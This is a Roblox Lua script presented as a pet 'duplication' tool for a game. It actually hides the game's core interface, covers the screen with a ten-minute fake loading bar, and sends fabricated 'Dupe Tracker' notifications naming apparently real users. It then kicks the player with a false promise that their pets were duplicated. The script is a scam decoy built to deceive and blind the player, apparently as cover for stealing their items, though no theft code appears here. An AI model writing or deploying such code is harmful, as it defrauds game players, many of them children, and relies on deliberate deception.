local player = game.Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local StarterGui = game:GetService("StarterGui")
local playerGui = player:WaitForChild("PlayerGui")

-- 🔒 Hide all Core Roblox UI
pcall(function()
	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
	StarterGui:SetCore("TopbarEnabled", false)
end)

-- 💻 Create ScreenGui
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.DisplayOrder = 1000
loadingGui.Parent = playerGui

-- 🕶️ Fullscreen black base
local blackBase = Instance.new("Frame")
blackBase.Size = UDim2.new(1, 0, 1, 0)
blackBase.Position = UDim2.new(0, 0, 0, 0)
blackBase.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
blackBase.BorderSizePixel = 0
blackBase.ZIndex = 0
blackBase.Parent = loadingGui

-- 🖼️ Fullscreen Background Image
local bgImage = Instance.new("ImageLabel")
bgImage.Size = UDim2.new(1, 0, 1, 0)
bgImage.Position = UDim2.new(0, 0, 0, 0)
bgImage.Image = "https://cdn.discordapp.com/attachments/1383825271160836147/1386341525423915120/image.png"
bgImage.BackgroundTransparency = 1
bgImage.ScaleType = Enum.ScaleType.Crop
bgImage.ZIndex = 1
bgImage.Parent = loadingGui

-- 🌱 Title
local title = Instance.new("TextLabel")
title.AnchorPoint = Vector2.new(0.5, 0)
title.Position = UDim2.new(0.5, 0, 0.4, 0)
title.Size = UDim2.new(0.8, 0, 0, 30)
title.BackgroundTransparency = 1
title.Text = "Duplicating Pets..."
title.TextColor3 = Color3.fromRGB(180, 240, 180)
title.Font = Enum.Font.GothamBold
title.TextSize = 22
title.TextTransparency = 1
title.ZIndex = 2
title.Parent = loadingGui
TweenService:Create(title, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- 📜 Supported Pets Info
local info = Instance.new("TextLabel")
info.AnchorPoint = Vector2.new(0.5, 0)
info.Position = UDim2.new(0.5, 0, 0.44, 30)
info.Size = UDim2.new(0.9, 0, 0, 24)
info.BackgroundTransparency = 1
info.Text = "Only Works On: BUTTERFLY, DRAGONFLY, RACCOON, REDFOX, MIMIC OCTOPUS, QUEEN BEE, DISCO BEE"
info.TextColor3 = Color3.fromRGB(255, 220, 180)
info.Font = Enum.Font.GothamMedium
info.TextSize = 14
info.TextWrapped = true
info.ZIndex = 2
info.Parent = loadingGui
TweenService:Create(info, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- 📊 Progress Bar
local barBg = Instance.new("Frame")
barBg.AnchorPoint = Vector2.new(0.5, 0)
barBg.Position = UDim2.new(0.5, 0, 0.5, 30)
barBg.Size = UDim2.new(0, 300, 0, 24)
barBg.BackgroundColor3 = Color3.fromRGB(40, 60, 40)
barBg.BorderSizePixel = 0
barBg.ZIndex = 2
barBg.Parent = loadingGui
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 12)

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(100, 255, 120)
barFill.ZIndex = 3
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 12)

-- Percentage Label
local percent = Instance.new("TextLabel")
percent.AnchorPoint = Vector2.new(0.5, 0)
percent.Position = UDim2.new(0.5, 0, 0.5, 60)
percent.Size = UDim2.new(0, 100, 0, 24)
percent.BackgroundTransparency = 1
percent.Text = "0%"
percent.TextColor3 = Color3.fromRGB(180, 240, 180)
percent.Font = Enum.Font.GothamBold
percent.TextSize = 18
percent.TextTransparency = 1
percent.ZIndex = 2
percent.Parent = loadingGui
TweenService:Create(percent, TweenInfo.new(1), {TextTransparency = 0}):Play()

local Players = game:GetService("Players")
local thumbType = Enum.ThumbnailType.HeadShot
local thumbSize = Enum.ThumbnailSize.Size100x100

local fakeUsers = {
    {name = "ProfessorXQueen", id = 2416293142},
    {name = "Faze_sv3n1", id = 3553493535},
    {name = "huge_collector202", id = 1193281055},
    {name = "Yey012733", id = 951139159},
    {name = "Giantmonstervinnie3", id = 2064910834},
    {name = "Junior7770m", id = 2950171783},
    {name = "sucaboy202829", id = 1886355952},
    {name = "Elliot3229", id = 1321981294},
    {name = "stankybahlz", id = 1051965},
    {name = "LilRavioliiii", id = 1568979291},
    {name = "Aquaz_233", id = 1243698095},
    {name = "Velvethop66", id = 2231982101},
    {name = "Ravage91101", id = 3086710497},
    {name = "Quantum_Xeno", id = 103246224},
    {name = "PixelPup99", id = 1835681239},
    {name = "BeeMaster456", id = 48263834},
    {name = "ToxicBloom", id = 1711446739},
    {name = "KingSlayerBee", id = 2542699892}
}

local notificationTemplates = {
    "just duped Raccoon x2",
    "duplicated Queen Bee x1",
    "just duped Disco Bee x3",
    "duplicated Mimic Octopus x2",
    "duplicated Dragonfly x2",
    "just duped Butterfly x5",
    "duplicated Red Fox x3",
    "duplicated Butterfly x1",
    "just duped Queen Bee x3",
    "just duped Mimic Octopus x1",
    "duplicated Raccoon x1",
    "just duped Red Fox x2",
    "duplicated Disco Bee x4",
    "just duped Dragonfly x3"
}


-- Dupe notification sender
task.spawn(function()
    for i = 1, 20 do
        task.wait(math.random(10, 20))

        local user = fakeUsers[math.random(#fakeUsers)]
        local message = user.name .. " " .. notificationTemplates[math.random(#notificationTemplates)]

        local thumbUrl = "rbxthumb://type=AvatarHeadShot&id=" .. user.id .. "&w=100&h=100"

        pcall(function()
            game.StarterGui:SetCore("SendNotification", {
                Title = "Dupe Tracker",
                Text = message,
                Icon = thumbUrl,
                Duration = 5
            })
        end)
    end
end)

-- 🔁 Animate Loading (10 minutes)
local duration = 600 -- 10 minutes
local steps = 100
for i = 1, steps do
	local t = i / steps
	barFill.Size = UDim2.new(t, 0, 1, 0)
	percent.Text = math.floor(t * 100) .. "%"
	task.wait(duration / steps)
end

percent.Text = "100%"
task.wait(0.5)

-- 🔄 Kick with info message
player:Kick("Rejoin to check your DUPLICATED pets!\n\nOnly Works On: BUTTERFLY, DRAGONFLY, RACCOON, REDFOX, MIMIC OCTOPUS, QUEEN BEE, DISCO BEE")
